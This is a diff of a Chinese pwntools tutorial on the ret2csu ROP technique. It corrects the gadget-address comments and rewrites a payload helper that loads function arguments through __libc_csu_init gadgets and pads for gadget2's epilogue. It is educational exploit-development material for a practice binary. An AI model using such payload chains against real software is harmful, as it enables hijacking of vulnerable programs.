@@ -23,9 +23,9 @@ elf = ELF('./vuln')
 # 在 IDA 中找 __libc_csu_init，或者
 csu_init = elf.symbols['__libc_csu_init']
 
-# gadget1（低地址）：
+# gadget1（高地址）：
 # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
-# gadget2（高地址，在 gadget1 前面约 0x1a 字节）：
+# gadget2（低地址，在 gadget1 前面约 0x1a 字节）：
 # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
 ```
 
@@ -46,12 +46,14 @@ def csu_call(func_got, arg1=0, arg2=0, arg3=0):
     payload += p64(0)           # rbx = 0
     payload += p64(1)           # rbp = 1（让 cmp 通过）
     payload += p64(func_got)    # r12 = 函数 GOT 地址
-    payload += p64(arg3)        # r13 → rdx（第3参数）
+    payload += p64(arg1)        # r13 → edi（第1参数；mov edi, r13d 是 32 位写，地址要能放进低 32 位）
     payload += p64(arg2)        # r14 → rsi（第2参数）
-    payload += p64(arg1)        # r15 → edi（第1参数）
-    # gadget1: call [r12+rbx*8] = call [func_got]
-    payload += p64(csu_gadget1)
-    payload += b'\x00' * 56     # 填充 gadget1 弹出的寄存器
+    payload += p64(arg3)        # r15 → rdx（第3参数）
+    # 调用返回后，gadget2 还有收尾指令：
+    # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+    payload += p64(0)           # 被 add rsp, 8 跳过
+    payload += p64(0) * 6       # 被 6 个 pop 弹出
+    # 调用方在返回值后继续拼接的 8 字节，就是 ret 的跳转地址
     return payload
 ```
 
